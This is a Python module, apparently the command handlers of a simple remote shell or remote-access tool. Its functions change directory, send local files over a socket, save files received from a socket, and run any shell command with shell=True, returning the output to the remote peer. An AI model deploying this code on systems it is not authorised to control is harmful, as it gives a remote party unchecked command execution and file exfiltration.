import os
import socket
import subprocess
from . import comm, logger


def cd(args: tuple[str, ...]):
    os.chdir(args[0])


def upload(sock: socket.socket, args: tuple[str, ...], verbose: bool):
    """
    Upload local file over a socket connection.

    Example:
        >>> "upload [source] [dest]"
    """

    f = open(args[0], "rb")
    data = f.read()
    logger.debug(
        f"[cmd:upload] sending {len(data)} bytes ({len(data) / 1024} KB)", verbose
    )
    sock.send(data)
    f.close()


def download(sock: socket.socket, args: tuple[str, ...], verbose: bool):
    """
    Download a file over a socket connection and save it locally.

    Example:
        >>> "download [source] [dest]"
    """

    bufsize = 1024 * 1024  # 1 MB

    f = open(args[1], "wb")
    sock.settimeout(1)
    total_bytes = 0
    chunk = sock.recv(bufsize)
    while chunk:
        f.write(chunk)
        total_bytes += len(chunk)
        logger.debug(
            f"[cmd:download] received {total_bytes} bytes ({total_bytes / 1024} KB)",
            verbose,
        )
        try:
            chunk = sock.recv(bufsize)
        except socket.timeout:
            break
    sock.settimeout(None)
    f.close()


def exec(sock: socket.socket, command: str, verbose: bool):
    execute = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    if execute.stdout and execute.stderr:
        result = execute.stdout.read() + execute.stderr.read()
        comm.send(sock, result.decode(), verbose)
    else:
        comm.send(sock, "[cmd:exec] invalid result", verbose)
